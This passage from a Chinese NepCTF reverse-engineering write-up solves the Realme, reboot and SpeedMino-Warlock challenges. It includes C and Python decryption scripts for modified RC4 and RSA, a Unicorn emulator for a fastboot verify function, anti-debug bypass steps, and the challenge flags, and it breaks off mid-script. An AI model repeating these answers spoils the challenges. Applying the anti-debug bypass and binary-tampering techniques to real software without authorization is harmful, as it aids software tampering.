<li>解XTEA算法，得到flag{a4747f82be106d3f8c4d747c744d7ee5}</li>
</ol>
<p>看到很多师傅是直接搜QRS::开头的函数，然后找到的对应逻辑，确实这是我考虑不周，只改了加密函数的包名没有修改最外层的包名，但这确实也是正确的分析思路。</p>
<h2 id="Realme"><a href="#Realme" class="headerlink" title="Realme"></a><strong>Realme</strong></h2><p>简单分析发现是魔改的rc4，发现最后的异或操作魔改为了取模</p>
<p>很明显这里的加密逻辑存在问题，因为按照我们测试数据的加密效果来看，我们的加密flag应当存在许多明文字符数据</p>
<p>我们查看段信息或者看对应段的汇编都可以发现一些奇怪的，有着可写权限的段，其中包括rc4相关逻辑和scanf的调用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXg5sY3Dc8jSajDOGzE1ic6uHv9mzu05zFqrFckTtibpedkCdDdTTdIEuCQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>但是动态调试并没有发现执行逻辑发生变化，很有可能存在反调试，我们利用<code>ScyllaHide</code>插件绕过反调试，让程序运行到判断结束处将程序dump下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgpQhm6NfB2oEkVz1IrwGibMHDptTcdJx0Ybx7gdiczlPcLvLBdRTg8KlA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>dump下来修复一下main函数的起始地址，分析dump下来的程序我们发现<code>scanf</code>被篡改为了一个反调试+解密的函数，rc4的加密逻辑也被修改了</p>
<p>第一部分解密+反调试放在<code>.CRT$XCT</code>（addr:0x4010A0），借助<code>CRT</code>初始化来让其优先于<code>main</code>函数执行，篡改<code>scanf</code>函数</p>
<p>而真正的rc4加密过程就是如下这样</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgI9ddIuQgJpv3RRBdzBrS4MoXpdXwXVNOXYhyx5UkniaWiawLCysDoSKQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXggLZWd10zSel7Pyxn13a3cmgb4Wfa10icyhFNe7PlPpaDqUics3kBBPyg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">void static rc4_init(unsigned char *s, unsigned char *key, unsigned long len)</span><br><span class="line">&#123;</span><br><span class="line">    int i = 0;</span><br><span class="line">    int j = 0;</span><br><span class="line">    unsignedchar k[256] = &#123;0&#125;;</span><br><span class="line">    unsignedchar temp = 0;</span><br><span class="line">    for (i = 0; i &lt; 256; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s[i] = i ^ 0xcf;</span><br><span class="line">        k[i] = key[i % len];</span><br><span class="line">    &#125;</span><br><span class="line">    for (i = 0; i &lt; 256; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = (j + s[i] + k[i]) % 256;</span><br><span class="line">        temp = s[i];</span><br><span class="line">        s[i] = s[j];</span><br><span class="line">        s[j] = temp ^ 0xad;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">void rc4_crypt(unsigned char *s, unsigned char *data, unsigned long len)</span><br><span class="line">&#123;</span><br><span class="line">    int i = 0, j = 0, t = 0;</span><br><span class="line">    unsignedlong k = 0;</span><br><span class="line">    unsignedchar temp;</span><br><span class="line">    for (k = 0; k &lt; len; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        i = (i + 1) % 256;</span><br><span class="line">        j = (j + s[i] * i) % 256;</span><br><span class="line">        temp = s[i];</span><br><span class="line">        s[i] = s[j];</span><br><span class="line">        s[j] = temp;</span><br><span class="line">        t = (s[i] + s[j]) % 256;</span><br><span class="line">        if (k % 2 == 0)</span><br><span class="line">            data[k] += s[t];</span><br><span class="line">        else</span><br><span class="line">            data[k] -= s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    unsignedchar enc[] = &#123;0x50, 0x59, 0xa2, 0x94, 0x2e, 0x8e, 0x5c, 0x95, 0x79, 0x16, 0xe5, 0x36, 0x60, 0xc7, 0xe8, 0x6, 0x33, 0x78, 0xf0, 0xd0, 0x36, 0xc8, 0x73, 0x1b, 0x65, 0x40, 0xb5, 0xd4, 0xe8, 0x9c, 0x65, 0xf4, 0xba, 0x62, 0xd0&#125;;</span><br><span class="line">    char key[] = &quot;Y0u_Can&#x27;t_F1nd_Me!&quot;;</span><br><span class="line">    char s[256] = &#123;0&#125;;</span><br><span class="line">    rc4_init(s, (unsignedchar *)key, strlen(key));</span><br><span class="line">    rc4_crypt(s, (unsignedchar *)enc, strlen(enc));</span><br><span class="line">    for (int i = 0; i &lt; strlen(enc); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;, enc[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>得到flag：<code>NepCTF&#123;Y0u_FiN1sH_Th1s_E3sy_Smc!!!&#125;</code></p>
<h2 id="reboot"><a href="#reboot" class="headerlink" title="reboot"></a><strong>reboot</strong></h2><p>本题为u-boot项目，查看提供的文件为android boot文件对此文件分割可以获取到kernel文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXg0ibua6pIGJZa8A8gBNXTj6WegxlJsrJz0Y5hnGlibMzL2aP242bOkkVg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>载入IDA中找到fastboot命令处</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgxaoyztzYTeMMV9ZkVNUXQiaHY4WvLGL2a4L353z8uPZhcpHNwkCiasYg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>使用ida命令调整结构，多出了一个verity函数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgeT6ibyoxBViaXfkicr7yRuiboFztRa0yB9jvXOOguf9UIQ17PmfyeiaVflA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>verity判断了一组字符串格式和长度</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgRf5Hy7ciaibict013rjfjtqUQUmro8LptYQqv51ILNKcVWHmz50IXG8Xw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>同时添加授权内容</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgpnCaxTBOGlTVUFpBOdnG22IkfzvibuvK5O9uparTruoxbYRWlB1PicNg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>可以对verity函数进行模拟执行即可运行起来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgBjibOZc4jGpy509kJmvuoIZbnf5XEFz2TTd4taicGD0LVVUj59eLccWw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line">from unicorn import *</span><br><span class="line">from unicorn.arm64_const import *</span><br><span class="line">import struct</span><br><span class="line">import capstone</span><br><span class="line"></span><br><span class="line">disassembler = capstone.Cs(capstone.CS_ARCH_ARM64,capstone.CS_MODE_ARM)</span><br><span class="line">def disas(code, addr):</span><br><span class="line">    for insn in disassembler.disasm(code, addr):</span><br><span class="line">        print(&quot;0x%x:\t%s\t%s&quot; % (insn.address, insn.mnemonic, insn.op_str))</span><br><span class="line"></span><br><span class="line">#MAP file to offset</span><br><span class="line">with open(&quot;kernel&quot;,&quot;rb&quot;) as f:</span><br><span class="line">    data=f.read()</span><br><span class="line"></span><br><span class="line">#some datas</span><br><span class="line">fastboot_malloc = 0x8818400</span><br><span class="line">fastboot_free = 0x8818ABC</span><br><span class="line">fastboot_oem = 0x880727C</span><br><span class="line">fastboot_rig = 0x882B2B0</span><br><span class="line">fastboot_err = 0x882B298</span><br><span class="line"></span><br><span class="line">pixel_loader_entry_run = 0x882C338</span><br><span class="line"></span><br><span class="line">ABL_LOAD_ADDRESS = 0x8800000</span><br><span class="line">MEMORY_START = 0x8000000</span><br><span class="line">MEMORY_SIZE = 200*1024*1024</span><br><span class="line">STACK_START = MEMORY_START + MEMORY_SIZE - 0x1000</span><br><span class="line">_current_heap_ptr = pixel_loader_entry_run + 0x1000</span><br><span class="line">def print_stack(uc,num=20):</span><br><span class="line">    sp = uc.reg_read(UC_ARM64_REG_SP)</span><br><span class="line">    print(f&quot;## STACK DUMP ##\nSP: &#123;sp:x&#125;&quot;)</span><br><span class="line">    for i,s in enumerate(range(sp,sp+num*8,8)):</span><br><span class="line">        if sp != 0:</span><br><span class="line">            v = struct.unpack(&quot;Q&quot;,uc.mem_read(s,8))[0]</span><br><span class="line">            print(f&quot;@&#123;s:x&#125; &#123;v:x&#125; - #&#123;i*8:x&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">def print_regs(uc):</span><br><span class="line">    for reg in [&quot;X0&quot;,&quot;X1&quot;,&quot;X2&quot;,&quot;X3&quot;,&quot;X8&quot;,&quot;X10&quot;,&quot;X12&quot;,&quot;X19&quot;,&quot;X20&quot;,&quot;X21&quot;,&quot;X22&quot;,&quot;X23&quot;,&quot;X24&quot;,&quot;X28&quot;,&quot;X29&quot;,&quot;X30&quot;,&quot;SP&quot;,&quot;PC&quot;]:</span><br><span class="line">        val = eval(f&quot;uc.reg_read(UC_ARM64_REG_&#123;reg&#125;)&quot;)</span><br><span class="line">        print(f&quot;&#123;reg&#125; - &#123;val:8X&#125;&quot;,end=&quot; &quot;)</span><br><span class="line">    print(&quot;&quot;)</span><br><span class="line"></span><br><span class="line"># callback for tracing basic blocks</span><br><span class="line">def hook_block(uc, address, size, user_data):</span><br><span class="line">    print(&quot;&gt;&gt;&gt; Tracing basic block at 0x%x, block size = 0x%x&quot; %(address, size))</span><br><span class="line"></span><br><span class="line"># callback for tracing instructions</span><br><span class="line">def hook_code(uc, address, size, user_data):</span><br><span class="line">    print(&quot;\n############################################&quot;)</span><br><span class="line">    print(f&quot;@&#123;address:x&#125; step size &#123;size:x&#125;&quot;)</span><br><span class="line">    disas(uc.mem_read(address,size),address)</span><br><span class="line">    print_regs(uc)</span><br><span class="line">    print_stack(uc)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">#Auto allocate pages of memory of size 10Mega on invalid memory access</span><br><span class="line">PAGE_SIZE=10*1024*1024</span><br><span class="line"></span><br><span class="line">def hook_malloc(uc, address, size, user_data):</span><br><span class="line">    global _current_heap_ptr</span><br><span class="line">    # Arguments for ARM64: size in x0</span><br><span class="line">    requested_size = uc.reg_read(UC_ARM64_REG_X0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # Simple bump allocator</span><br><span class="line">    allocated_address = _current_heap_ptr</span><br><span class="line">    # Align to 16 bytes for ARM64 typically</span><br><span class="line">    aligned_size = (requested_size + 15) &amp; ~15</span><br><span class="line">    _current_heap_ptr += aligned_size</span><br><span class="line"></span><br><span class="line">    # Check if we ran out of heap space</span><br><span class="line">    if _current_heap_ptr &gt;= (MEMORY_START + MEMORY_SIZE): # Or a defined heap_end</span><br><span class="line">        print(&quot;Error: Ran out of heap space!&quot;)</span><br><span class="line">        uc.emu_stop() # Stop emulation on out of memory</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # print(f&quot;Allocated 0x&#123;aligned_size:x&#125; bytes at 0x&#123;allocated_address:x&#125;&quot;)</span><br><span class="line">    uc.reg_write(UC_ARM64_REG_X0, allocated_address)</span><br><span class="line">    ret_addr = uc.reg_read(UC_ARM64_REG_X30)</span><br><span class="line">    uc.reg_write(UC_ARM64_REG_PC, ret_addr)</span><br><span class="line">    # print(f&quot;Adjusted PC to return address: 0x&#123;ret_addr:x&#125;&quot;)</span><br><span class="line"></span><br><span class="line">def hook_free(uc, address, size, user_data):</span><br><span class="line">    ret_addr = uc.reg_read(UC_ARM64_REG_X30)</span><br><span class="line">    uc.reg_write(UC_ARM64_REG_PC, ret_addr)</span><br><span class="line">def hook_oem(uc, address, size, user_data):</span><br><span class="line">    ret_addr = uc.reg_read(UC_ARM64_REG_X30)</span><br><span class="line">    uc.reg_write(UC_ARM64_REG_PC, ret_addr)</span><br><span class="line">def hook_section(uc, address, size, user_data):</span><br><span class="line">    a = mu.reg_read(UC_ARM64_REG_X10)</span><br><span class="line">    mu.reg_write(UC_ARM64_REG_X10, a + ABL_LOAD_ADDRESS)  # Example modification</span><br><span class="line">    # print(f&quot;Hooked section at 0x&#123;address:x&#125; with size &#123;size:x&#125;&quot;)</span><br><span class="line">    # You can add custom logic here if needed</span><br><span class="line"></span><br><span class="line">def hook_rig(uc, address, size, user_data):</span><br><span class="line">    print(&quot;&gt;&gt;&gt; Hooked fastboot_rig at 0x%x&quot; % address)</span><br><span class="line"></span><br><span class="line">    ret_addr = uc.reg_read(UC_ARM64_REG_X30)</span><br><span class="line">    uc.reg_write(UC_ARM64_REG_PC, ret_addr)</span><br><span class="line"></span><br><span class="line">def hook_err(uc, address, size, user_data):</span><br><span class="line">    print(&quot;&gt;&gt;&gt; Hooked fastboot_err&quot; )#at 0x%x&quot; % address)</span><br><span class="line"></span><br><span class="line">    ret_addr = uc.reg_read(UC_ARM64_REG_X30)</span><br><span class="line">    uc.reg_write(UC_ARM64_REG_PC, ret_addr)</span><br><span class="line">try:</span><br><span class="line">    # Initialize emulator in ARM mode</span><br><span class="line">    mu = Uc(UC_ARCH_ARM64, UC_MODE_ARM)</span><br><span class="line"></span><br><span class="line">    mu.mem_map(MEMORY_START, MEMORY_SIZE)</span><br><span class="line"></span><br><span class="line">    mu.mem_write(ABL_LOAD_ADDRESS, data)    </span><br><span class="line">    # FLAG_STRING = b&quot;NepCTF&#123;&#125;\0&quot;</span><br><span class="line"></span><br><span class="line">    FLAG_STRING = b&quot;NepCTF&#123;00000000000000000000000000000000&#125;\0&quot;</span><br><span class="line">    STRINGADDRESS = MEMORY_START + 0x1000</span><br><span class="line">    mu.mem_write(STRINGADDRESS, FLAG_STRING)</span><br><span class="line"></span><br><span class="line">    # mu.hook_add(UC_HOOK_BLOCK, hook_block)</span><br><span class="line">    # mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">    mu.hook_add(UC_HOOK_CODE, hook_malloc, begin=fastboot_malloc,end=fastboot_malloc)</span><br><span class="line">    mu.hook_add(UC_HOOK_CODE, hook_free, begin=fastboot_free,end=fastboot_free)</span><br><span class="line">    mu.hook_add(UC_HOOK_CODE, hook_oem, begin=fastboot_oem,end=fastboot_oem)</span><br><span class="line">    mu.hook_add(UC_HOOK_CODE, hook_rig, begin=fastboot_rig,end=fastboot_rig)</span><br><span class="line">    mu.hook_add(UC_HOOK_CODE, hook_err, begin=fastboot_err,end=fastboot_err)</span><br><span class="line"></span><br><span class="line">    mu.hook_add(UC_HOOK_CODE, hook_section, begin=ABL_LOAD_ADDRESS + 0x2B9A0 ,end=ABL_LOAD_ADDRESS + 0x2B9A0 )</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    mu.reg_write(UC_ARM64_REG_SP,STACK_START)</span><br><span class="line">    mu.reg_write(UC_ARM64_REG_X0, STRINGADDRESS)</span><br><span class="line">    mu.emu_start(pixel_loader_entry_run, 0,count=50000)</span><br><span class="line">        </span><br><span class="line">    pc = mu.reg_read(UC_ARM64_REG_PC)</span><br><span class="line">    print(f&quot;&gt;&gt;&gt; PC = 0x&#123;pc:x&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">except UcError as e:</span><br><span class="line"></span><br><span class="line">    print(&quot;ERROR: %s&quot; % e),</span><br></pre></td></tr></table></figure></div>

<h2 id="SpeedMino-Warlock"><a href="#SpeedMino-Warlock" class="headerlink" title="SpeedMino-Warlock"></a><strong>SpeedMino-Warlock</strong></h2><p>奇怪的dll指的是 version.dll，根据字符串特征发现是 lovely-injector 注入程序，用于修改lua代码</p>
<p>lovely-injector 项目可看到注入方式为 luaL_loadbufferx</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgqia2gZuVbLkfHNHYmyibLN8P0tUWiaDJB11d5AxsO7ibpGCcfdeGcOOMLw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>可发现注入代码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgbCrzgJIyuqhbgJLZAnum7NOfG8Z45dP6TY0ARAfIBkU9wHceMhibycg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>load 字节码 是 LuaJIT，在线反编译，一个简单rsa计算,注意还需要解一个rc4魔改</p>
<p>出题 and 解题</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"># 模N大数的幂乘的快速算法</span><br><span class="line">import math</span><br><span class="line"></span><br><span class="line">def fastExpMod(b, e, m):# 底数，幂，大数N</span><br><span class="line">    result = 1</span><br><span class="line">    e = int(e)</span><br><span class="line">    while e != 0:</span><br><span class="line">        if e % 2 != 0:  # 按位与</span><br><span class="line">            e -= 1</span><br><span class="line">            result = (result * b) % m</span><br><span class="line">            continue</span><br><span class="line">        e &gt;&gt;= 1</span><br><span class="line">        b = (b * b) % m</span><br><span class="line">    return result</span><br><span class="line">    # 测试案例</span><br><span class="line">    # c = fastExpMod(3,22,12)</span><br><span class="line">    # print(c) 9</span><br><span class="line"></span><br><span class="line"># 根据选择的e，匹配出唯一的d</span><br><span class="line">def match_d(a,m):</span><br><span class="line">    if math.gcd(a, m) != 1:</span><br><span class="line">        returnNone# no mod inverse if a &amp; m aren&#x27;t relatively prime</span><br><span class="line">    # Calculate using the Extended Euclidean Algorithm:</span><br><span class="line">    u1, u2, u3 = 1, 0, a</span><br><span class="line">    v1, v2, v3 = 0, 1, m</span><br><span class="line">    while v3 != 0:</span><br><span class="line">        q = u3 // v3 # // is the integer division operator</span><br><span class="line">        v1, v2, v3, u1, u2, u3 = (u1 - q * v1), (u2 - q * v2), (u3 - q * v3), v1, v2, v3</span><br><span class="line">    return u1 % m</span><br><span class="line"></span><br><span class="line">def encrypt(M, e, n):</span><br><span class="line">    return fastExpMod(M, e, n)</span><br><span class="line"></span><br><span class="line">def decrypt(C, d, m):</span><br><span class="line">    return fastExpMod(C, d, m)</span><br><span class="line"></span><br><span class="line"># 生成密钥（包括公钥和私钥）</span><br><span class="line">def create_keys(p,q,e):</span><br><span class="line">    #p = create_prime_num(keylength / 2)</span><br><span class="line">    #q = create_prime_num(keylength / 2)</span><br><span class="line">    n = p * q</span><br><span class="line">    # euler函数值</span><br><span class="line">    fn = (p - 1)*(q - 1)</span><br><span class="line">    #e = 1</span><br><span class="line">    d = match_d(e, fn)</span><br><span class="line">    return (n, e, d)</span><br><span class="line"></span><br><span class="line">def getMyPrime(k1,k2):</span><br><span class="line">    a = 0 + (k1 + 1) * 384 + k2</span><br><span class="line">    while(True):</span><br><span class="line">        i = 2</span><br><span class="line">        while(True):</span><br><span class="line">            if i * i &gt; a and (a - 1) % 5 != 0:</span><br><span class="line">                return a</span><br><span class="line">            if a % i == 0:</span><br><span class="line">                break</span><br><span class="line">            i = i + 1</span><br><span class="line">        a = a + 1</span><br><span class="line">    return383</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pnums = [359,383]</span><br><span class="line">flag = b&quot;NepCTF&#123;Y0u_c4n_M0dDing_LOVE2D_g@mE_By_l0vely_iNjector!&#125;&quot;</span><br><span class="line"></span><br><span class="line">flag = [230,210,245,223,98,97,151,114,63,90,139,78,204,42,227,68,202,55,242,163,103,108,231,197,142,255,180,98,123,0,184,145,164,171,247,41,92,21,89,100,22,125,87,98,10,142,70,107,101,142,60,65,168,214,243,]</span><br><span class="line">for i in range(len(flag)):</span><br><span class="line">    e = 5</span><br><span class="line">    n, e, d = create_keys(pnums[i],pnums[i+1],e)</span><br><span class="line">    enc = encrypt(64+flag[i],e,n) # </span><br><span class="line">    dec = decrypt(enc,d,n) # Solve</span><br><span class="line">    pnums.append(getMyPrime(i,flag[i]))</span><br><span class="line">    # print(n, e, d, enc,dec)</span><br><span class="line">    print(dec,end=&#x27;,&#x27;)</span><br><span class="line"></span><br><span class="line"># print(pnums)</span><br><span class="line">MOD = 256</span><br><span class="line"></span><br><span class="line">def KSA(key):</span><br><span class="line">    key_length = len(key)</span><br><span class="line">    # create the array &quot;S&quot;</span><br><span class="line">    S = 